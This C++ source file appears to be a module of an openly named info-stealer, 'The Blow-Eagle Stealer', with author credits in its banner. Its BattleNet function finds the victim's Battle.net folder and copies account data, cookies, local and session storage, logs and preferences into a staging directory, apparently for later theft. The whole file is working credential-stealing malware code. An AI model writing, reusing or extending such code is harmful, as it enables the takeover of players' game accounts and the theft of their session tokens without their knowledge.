/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

#include "../targets.h"
#include "../../config/config.c"
#include  "../../helper/helper.h"

void gaming::BattleNet()
{
	printf("BattleNet\n");

	std::string user = func::GetUser();
	if (std::filesystem::exists("C:/Users/" + user + "/AppData/Local" + "/Battle.net")) 
	{
		std::string appdata = "C:/Users/" + user + "/AppData/Local";

		std::string files[] = {
		 "/Battle.net/BrowserCaches/LocalPrefs.json",
		 "/Battle.net/BrowserCaches/common/Cookies"
		};
		std::string dirs[] =
		{
			"/Battle.net/Account",
			"/Battle.net/BrowserCaches/common/Local Storage",
			"/Battle.net/BrowserCaches/common/Session Storage",
			"/Battle.net/Logs"
		};

		std::string defaultPaths[] = {

		"C:/Users/" + user + config::path + "/Games",
		"C:/Users/" + user + config::path + "/Games/Battle.net",
		"C:/Users/" + user + config::path + "/Games/Battle.net/BrowserCaches",
		"C:/Users/" + user + config::path + "/Games/Battle.net/BrowserCaches/common",
		"C:/Users/" + user + config::path + "/Games/Battle.net/BrowserCaches/common/Cookies",
		"C:/Users/" + user + config::path + "/Games/Battle.net/BrowserCaches/common/Local Storage",
		"C:/Users/" + user + config::path + "/Games/Battle.net/BrowserCaches/common/Session Storage",

		};

		for (size_t i = 0; i < std::size(defaultPaths); i++)
		{
			int result = _mkdir(defaultPaths[i].c_str());
		}

		try
		{
			for (size_t i = 0; i < std::size(dirs); i++)
			{
				func::copyDirectory(appdata + dirs[i], defaultPaths[0] + dirs[i]);
				//std::cout << "\n\n\n" << appdata + dirs[i] << "  |  " << defaultPaths[0] + dirs[i] << "\n\n\n";
			}
		}
		catch (const char* error_message)
		{
			std::cout << error_message << std::endl;
		}

		try
		{
			for (size_t i = 0; i < std::size(files); i++)
			{
				func::copyFile(appdata + files[i], defaultPaths[0] + files[i]);
				//std::cout << "\n\n\n" << appdata + files[i]<<"  |  " << defaultPaths[0] + files[i] << "\n\n\n";
			}
		}
		catch (const char* error_message)
		{
			std::cout << error_message << std::endl;
		}

	}
	
}